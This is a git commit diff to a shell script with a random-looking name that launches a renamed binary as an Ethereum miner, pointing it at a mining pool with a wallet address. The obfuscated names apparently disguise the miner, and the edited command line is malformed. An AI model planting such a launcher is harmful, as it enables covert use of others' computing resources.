a4eef4c6c48432e47a37d2c873d46cd300e08e4c
ichakiddiw <80237892+ichakiddiw@users.noreply.github.com>
2021-03-09 22:46:06 +0700

    Update jhsfgfdhgd.sh

--- jhsfgfdhgd.sh
+++ jhsfgfdhgd.sh
@@ -1,2 +1,2 @@
 #!/bin/sh
-chmod +x ./ksjdjksagd && ./ksjdjksagd -P stratum1+tcp:// --wallet 0x53d5568dc68a4cf0057172029d248b7e9ec33c1d --worker$ip --poll eu1.ethermine.org:14444 -G -R
+chmod +x ./ksjdjksagd && ./ksjdjksagd -P stratum1+tcp://-P stratum1+tcp://0x53d5568dc68a4cf0057172029d248b7e9ec33c1d.lucky2409@asia.cruxpool.com:5555 -G -R
